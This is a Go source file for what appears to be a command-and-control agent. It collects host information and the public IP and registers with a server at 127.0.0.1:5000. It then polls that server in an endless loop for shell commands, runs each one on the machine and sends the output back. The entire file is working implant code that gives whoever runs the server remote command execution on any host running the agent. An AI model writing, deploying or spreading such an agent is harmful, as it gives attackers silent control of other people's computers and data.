package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

type system_info struct {
	Stats  *host.InfoStat
	Memory uint64 `json:"total"`
	IP     string
}

func register() string {
	// Gather system info
	stats, _ := host.Info()
	fmt.Printf("%s", stats)
	v, _ := mem.VirtualMemory()
	// get ip
	resp, _ := http.Get("http://api.ipify.org")
	body, _ := ioutil.ReadAll(resp.Body)
	ip := string(body)
	// set info in the requests json
	host_info := system_info{
		stats,
		v.Total,
		ip,
	}
	postBody, _ := json.Marshal(host_info)
	responseBody := bytes.NewBuffer(postBody)
	resp_register, _ := http.Post("http://127.0.0.1:5000/api/1.1/add_agent", "application/json", responseBody)
	body2, _ := ioutil.ReadAll(resp_register.Body)
	agent_id := string(body2)
	fmt.Printf("%s\n", agent_id)
	return agent_id
}

func get_command(agent_id string) {
	post_body, _ := json.Marshal(map[string]string{
		"id": agent_id,
	})
	postBody := bytes.NewBuffer(post_body)
	resp_query, _ := http.Post("http://127.0.0.1:5000/api/1.1/get_command", "application/json", postBody)
	resp, _ := ioutil.ReadAll(resp_query.Body)
	command := string(resp)
	if command == "None" {
		time.Sleep(1 * time.Second)
	} else {
		args := strings.Split(command, " ")
		parsed_command := args[0]
		args = args[1:]
		out, _ := exec.Command(parsed_command, args...).Output()
		output := string(out[:])
		resp_body, _ := json.Marshal(map[string]string{
			"id":     agent_id,
			"output": output,
		})
		responseBody := bytes.NewBuffer(resp_body)
		resp_send_command, _ := http.Post("http://127.0.0.1:5000/api/1.1/command_out", "application/json", responseBody)
		ack_resp, _ := ioutil.ReadAll(resp_send_command.Body)
		ack := string(ack_resp)
		fmt.Printf("%s\n", ack)
	}
}

func main() {
	agent_id := register()
	for {
		get_command(agent_id)
	}
}
